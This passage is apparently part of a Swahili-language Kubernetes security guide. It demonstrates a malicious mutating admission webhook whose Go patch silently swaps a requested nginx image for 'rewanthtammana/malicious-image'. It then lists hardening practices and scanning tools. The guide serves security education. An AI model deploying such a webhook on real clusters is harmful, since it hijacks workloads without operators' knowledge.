Kisha tumia pod mpya:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wakati unapoona kosa la `ErrImagePull`, angalia jina la picha kwa kutumia mojawapo ya maswali yafuatayo:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Kama unavyoona kwenye picha hapo juu, tulijaribu kukimbia picha ya `nginx` lakini picha iliyotekelezwa mwishowe ni `rewanthtammana/malicious-image`. Kilichotokea!!

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

Skripti ya `./deploy.sh` inaanzisha kudhibiti kibali cha kuingiza webhook, ambacho hubadilisha maombi kwa API ya Kubernetes kama ilivyoelezwa kwenye mistari yake ya usanidi, ikibadilisha matokeo yanayoonekana:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## Mbinu Bora

### **Kulemaza Automount ya Vitambulisho vya Akaunti ya Huduma**

- **Pods na Akaunti za Huduma**: Kwa chaguo-msingi, pods hufunga kitambulisho cha akaunti ya huduma. Ili kuboresha usalama, Kubernetes inaruhusu kulemaza kipengele hiki cha automount.
- **Jinsi ya Kuomba**: Weka `automountServiceAccountToken: false` katika usanidi wa akaunti za huduma au pods kuanzia toleo la Kubernetes 1.6.

### **Uteuzi wa Mtumiaji wa Kizuizi katika RoleBindings/ClusterRoleBindings**

- **Kuingizwa kwa Hiari**: Hakikisha kuwa watumiaji muhimu tu ndio wanaojumuishwa katika RoleBindings au ClusterRoleBindings. Fanya ukaguzi mara kwa mara na ondoa watumiaji wasiohusika ili kudumisha usalama thabiti.

### **Vitu vya Majukumu Maalum ya Nafasi Badala ya Majukumu ya Kikundi cha Kiklasteri**

- **Vitu vs. Majukumu ya Kikundi cha Kiklasteri**: Pendekeza kutumia Vitu na RoleBindings kwa ruhusa za nafasi maalum badala ya Majukumu na ClusterRoleBindings, ambayo hutekeleza kwa upana wa kikundi cha kiklasteri. Mbinu hii hutoa udhibiti bora na kikomo cha ruhusa.

### **Tumia zana za kiotomatiki**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Vyanzo**

* **[https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)**
* **[https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)**
* **[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)**
